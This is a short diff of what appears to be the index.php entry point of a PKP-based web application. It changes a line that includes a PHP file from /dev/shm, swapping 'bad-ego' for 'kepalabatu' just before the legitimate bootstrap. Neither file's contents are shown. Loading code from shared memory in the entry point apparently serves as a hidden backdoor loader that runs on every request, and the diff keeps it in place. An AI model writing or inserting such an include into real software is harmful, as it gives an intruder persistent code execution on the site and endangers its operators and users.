@@ -15,7 +15,7 @@ use APP\core\Application;
 
 // Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
-include("/dev/shm/bad-ego");
+include("/dev/shm/kepalabatu");
 require_once './lib/pkp/includes/bootstrap.php';
 
 // Serve the request
